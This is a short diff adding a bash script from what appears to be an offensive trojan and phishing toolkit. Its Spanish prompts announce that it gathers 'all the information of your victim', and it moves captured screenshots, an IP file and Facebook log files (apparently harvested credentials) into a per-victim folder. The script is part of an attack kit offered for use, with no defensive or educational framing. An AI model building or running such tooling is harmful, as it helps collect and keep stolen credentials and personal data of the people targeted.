@@ -1,0 +1,9 @@
+bash .banner
+echo "Esta parte esta para recolectar toda la informacion"
+echo "de tu victima,introduce un nombre a tu carpeta:"
+read input
+bash .banner
+mkdir $input
+mv .troyan/wpscrack/ft/*.png $HOME/MgToLs/.Troyan/$input/
+mv Ip.txt $HOME/MgToLs/.Troyan/$input/
+cp .troyan/wpscrack/facebook/logs.txt -r $HOME/MgToLs/.Troyan/$input/
